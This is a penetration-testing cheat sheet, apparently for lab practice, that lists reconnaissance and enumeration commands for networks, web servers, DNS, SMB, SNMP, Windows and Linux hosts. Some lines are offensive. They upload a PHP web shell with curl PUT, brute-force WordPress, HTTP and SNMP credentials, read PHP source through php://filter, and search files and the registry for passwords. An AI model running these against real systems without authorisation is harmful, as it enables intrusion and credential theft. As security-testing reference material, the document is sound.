
  == IP DISCOVERY ==
netdiscover -r 10.0.2.0/24
nmap -sP 10.195.0.0/16 // ping discovery scan
  
## NMAP Service and OS Detection
nmap -sT -A -sV --version-intensity 6 -p- 192.168.31.149

nmap -sTU -A 192.168.1.1   // Os and services for TCP and UDP
nmap -sV 192.168.1.1    // service detection
nmap -sV --version-intensity 5 192.168.1.1 // service detection agressive. 0 is less agressive
xprobe2 -v -p tcp:80:open IP

== PORT SCANNING ==
## nmap -sS is the default scanning mode // TCP SYN SCAN
nmap -iL list-of-ips.txt    //scan the targets from the text file
nmap 192.168.1.1 /24   //scan a subnet
nmap -F 192.168.1.1   //scan most common 100 ports. Fast.
nmap -p 100-200 192.168.1.1   // scan a range of ports
nmap -p- 192.168.1.1    // scan all ports
nmap -Pn -F 192.168.1.1   //scan selected ports and ignore discovery

## Other NMAP parameters
-oN outputfile.txt    // save as txt
--script=ssl-heartbleed // checks for heartbleed

    == Unicorn scans ==  // port scanner
us -H -msf -Iv 192.168.56.101 -p 1-65535  ## TCP connect SYN scan
us -H -mU -Iv 192.168.56.101 -p 1-65535   ## UDP scan

## -H = resolve hostnames 
## -m = scan mode (sf - tcp, U - udp)
## -Iv - verbose

## Locate NSE scripts
locate nse | grep script

  == DOMAIN info: ==
whois domain.com
whois x.x.x.x
http://netcraft.com/       //domain and hosting information
https://archive.org/web/   //Wayback machine

   == HTTP finderprinting ==
wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt

== WEB DIRECTORY ENUMERATION ==
## searches for known files, like robots.txt, .htaccess, .htpasswd, etc
nmap --script http-enum 192.168.10.55  

## grab robots.txt and filter it
curl -s http://192.168.56.102/robots.txt | grep Disallow | sed 's/Disallow: //'

## check which page is accessible to us (200 OK)
for i in $(curl -s http://192.168.56.102/robots.txt | grep Disallow | sed 's/Disallow: //') ; \
do RESULT=$(curl -s -I http://192.168.56.102"$i" | grep "200 OK") ; echo -e "$i $RESULT\r" ; done

## brute force a directory with custom wordlists
nmap -p80 --script=http-brute --script-args 'http-brute.path=/printers/, userdb=/usr/share/wordlists/metasploit/http_default_users.txt, passdb=/usr/share/wordlists/rockyou.txt' 192.168.x.x   

## HTTP brute force a protected directory. Auditing against http basic, digest and ntlm authentication.
## This script uses the unpwdb and brute libraries to perform password guessing
nmap -p80 --script http-brute --script-args http-brute.path=/printers/ 192.168.x.x

## Discovers hostnames that resolve to the target's IP address by querying the online database at www.bfk.de
nmap --script -http-enum --script-args http-enum.basepath='pub/' 192.168.x.x

## Files and folders in a web root directory.
## /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
dirb http://192.168.x.x

## WEB page headers
nmap --script=http-headers 192.168.1.0/24

## WEb page headers
root@kali:~# nc -nvv 192.168.31.149 80
(UNKNOWN) [192.168.31.149] 80 (http) open
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 06 Mar 2018 11:47:38 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Sun, 12 Nov 2017 16:12:12 GMT
ETag: "512-55dcb6aaa2f50"

## WEB page titles from a subnet of IPs
nmap --script http-title -sV -p 80 192.168.1.0/24  

## Grab banners
root@kali:~# nc -n -vv 192.168.13.230 80 
HEAD / HTTP/1.1      // or 1.0
HEAD   ### <address>Apache/2.2.22 (Ubuntu) Server at xyz.com Port 80</address>
GET /index

## HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
curl -v -X OPTIONS http://192.168.230.153/test/

#get page with different user agent
curl -H "User-Agent:Mozilla/4.0" http://192.168.31.146:8080/phptax/ | head -n2

# create a .php file in /test directory with curl. 
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php

#connect to a UDP port 
nc -u localhost 161

  == DNS enumeration ==
dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n
dnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains
dnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server
nmap -sU -p 22 --script=*dns* 192.168.1.200

## find DNS (A) records by trying a list of common sub-domains from a wordlist.
nmap -p 80 --script dns-brute.nse domain.com
python dnscan.py -d domain.com -w ./subdomains-10000.txt

  == SSH server info ==
nmap --script=ssh2-enum-algos,ssh-hostkey,sshv1.nse 192.168.13.234 

  == WINDOWS ==
# search for files
C:\> dir /s /b network-secret.txt

dir /q calc.exe //display ownership
dir /a:d calc.exe // /a is mandatory
  d Directories
  h Hidden files
  s System files

# Find all listening ports and filer by string
netstat -aon | find /i "listening" | findstr 127.0.0.1

#find out the used  open ports in Windows
netstat -an | find /i "Listening"
netstat -an | find /i "Established"

#enumerate Windows services
tasklist /svc

# Find all listening ports and show the process and PID too
protocol, PID, port, service name, service, state of the connection. Use "| findstr" to filter.
netstat -abno

# Queries the configuration information for a specified service.
C:\WINDOWS\system32>sc qc alg
sc qc alg
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: alg
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\alg.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Application Layer Gateway Service  
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService  
----------


#list security policy
net accounts

#list users
net users
WMIC /NODE: "BOB" COMPUTERSYSTEM GET USERNAME   ##needs admin  

#Display the username/domain you are currently logged in with
C:\Users\Administrator> echo %USERDOMAIN%\%USERNAME%
testdomain\Administrator

#list privileges via cmd
cacls *
cacls "C:\Program Files" /T | findstr Users
cacls *.exe | findstr "IUSR_BOB:F"  ## lists permissions of *.exe and searches for the user and his full permissions string "IUSR_BOB:F". 

#search for passwords in the Windows Registry
reg query "HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon"
reg query "HKLM\System\CurrentControlSet\Services\SNMP"

#Display the hosts file
type C:\Windows\system32\drivers\etc\hosts
type c:\Winnt\system32\drivers\etc\hosts   //Windows 2000

#display ARP table
arp -a

#display routing table
routeprint

#find out if Windows is 32 or 64 bits from cmd
wmic os get osarchitecture

#find out Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#get general system info from cmd
systeminfo

#get username 
echo %username%

#display existing users
net users

#show firewall state. From WinXP upwards
netsh firewall show state

#firewall config
netsh firewall show config


  == LINUX ==
## Use LinuxEnum.sh script
./LinEnum.sh

# search for files
find / -name "network-secret.txt"
locate "network-secret.txt"

# Search for specific strings inside a file
strings ./*.txt | grep password
grep -l -i pass /var/log/*.log 2>/dev/null
find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null // searches for the string 'password' and output the line number
find / -maxdepth 10 -name *etc* -type f | grep -Hn pass; 2>/dev/null  //as above, but in *etc*

  ## ls commands
find / -perm -4000 -type f 2>/dev/null      //Find SUID files
find / -uid 0 -perm -4000 -type f 2>/dev/null   //Find SUID files owned by root
find / -perm -2000 -type f 2>/dev/null      // Find files with GUID bit set
find / -perm -2 -type f 2>/dev/null         //Find world-writable files
find / -perm -2 -type d 2>/dev/null         //Find word-writable directories
find /home –name .rhosts -print 2>/dev/null    //Find rhost config files
ls -ahlR /root/      //list files recursively

  ## Service information
ps aux | grep root    // View services running as root
cat /etc/inetd.conf     // List services managed by inetd
cat /etc/xinetd.conf    // As above for xinetd


## Find out what Linux interpreter you are using
ps -p $$

## see $PATH in Linux
echo $PATH

## chanage $PATH. As in add something to the PATH
export PATH=/some/path1:/some/path2  //redefine $PATH bash variable

== WEB APPLICATION SCANNERS ==
## scan Joomla
joomscan -u http://192.168.230.150:8081

## scan Wordpress
wpscan domain.com

## enumerate Wordpress users
wpscan --url http://10.10.10.2 --enumerate u

## bruteforce Wordpress user's password
wpscan --url 10.10.10.2/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2

## scan a web appliction with nikto
nikto -C all -h http://IP

## scan web apps
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
skipfish -o 202 http://192.168.1.202/wordpress   ## Using the given directory for output (-o 202) , scan the web application URL 
## (http://192.168.1.202/wordpress):

## LFI, RFI, RCE
uniscan -u http://192.168.44.134:10000/ -qweds

### Test for LFI
# Harvest links from a page (to test for LFI)
fimap -H -u "http://192.168.56.129" -d 3 -w /tmp/urllist
#test for LFI using harvested links
fimap -m -l /tmp/urllist

  == SQL ==
sqlmap -u "http://192.168.56.129/?page=login" -a --level=5
hexorbase  ##MySql, Oracle, PostgreSQL, SQLlite, MS-Sql browser

  == SMB NETBIOS== 
enum4linux target
nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254
nbtscan -r 192.168.11.0/24
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
smbmap -u "" -p "" -d MYGROUP -H 10.11.1.22



## NetBIOS NullSession enumeration
## This  feature  exists  to  allow  unauthenticated  machines  to  obtain  browse  lists  from  other  
## Microsoft   servers. Enum4linux is a wrapper  built on top of smbclient,rpcclient, net and nmblookup
./enum4linux -a 192.168.1.1

## NMAP SMB scripts
nmap --script smb-* --script-args=unsafe=1 192.168.10.55 

##  ls -lh /usr/share/nmap/scripts/smb*	
smb-brute.nse
smb-enum-domains.nse
smb-enum-groups.nse
smb-enum-processes.nse
smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
smb-flood.nse
smb-ls.nse
smb-mbenum.nse
smb-os-discovery.nse
smb-print-text.nse
smb-psexec.nse
smb-security-mode.nse
smb-server-stats.nse
smb-system-info.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-regsvc-dos.nse
smbv2-enabled.nse

#mount SMB (Netbios/Windows) shares in Linux
smbclient -L \\WIN7\ -I 192.168.13.218
smbclient -L \\WIN7\ADMIN$  -I 192.168.13.218
smbclient -L \\WIN7\C$ -I 192.168.13.218
smbclient -L \\WIN7\IPC$ -I 192.168.13.218
smbclient '\\192.168.13.236\some-share' -o user=root,pass=root,workgroup=BOB

#mount MSB shares in Windows (via cmd)
net use X: \\<server>\<sharename> /USER:<domain>\<username> <password> /PERSISTENT:YES

    == SNMP ==
nmap -sU -p 161 --script=*snmp* 192.168.1.200
xprobe2 -v -p udp:161:open 192.168.1.200

msf >  use auxiliary/scanner/snmp/snmp_login
msf > use auxiliary/scanner/snmp/snmp_enum

snmp-check 192.168.1.2 -c public
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
onesixtyone -c /usr/share/wordlists/dirb/small.txt 192.168.1.200  // find communities with bruteforce
for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt);do snmpwalk -v 1 -c $i 192.168.1.200;done| grep -e "Timeout" // find communities with bruteforce


 == PHP ==
## Read PHP source code with php://filter
http://192.168.56.129/?page=upload   // original page
http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
curl http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
-- The result needs to be decoded from Base64

 
 == STENOGRAPHICS / EXIF ==
exiftool somephoto.png
steghide extract -sf ./file.wav
steghide extract -sf ./image.jpg
steghide info ./image.jpg

# Connect to IMAP SSL
openssl s_client -connect 192.168.44.133:993 -crlf

# Decode Base64 Encoded Values
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

# Decode Hexidecimal Encoded Values
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

# Remove words less than 8 characters (for WPA)
cat really_big_list.txt | sort -u | pw-inspector -m 8 -M 63 > wpa_wordlist.txt

#remove first 15 lines from a text file
sed -i 1,15d ./somefile.txt

#remove non numeric chaaracters from a file
tr -cd '0-9\012' < ./myfile.sorted > myfile.sorted2

#keep line/words with more than 32 characters/bits  (for MD5 filtering)
awk 'length>=32' ./list.txt > ./list.sorted

# newline after each blank space
sed -i 's/ /\n/g' ./test



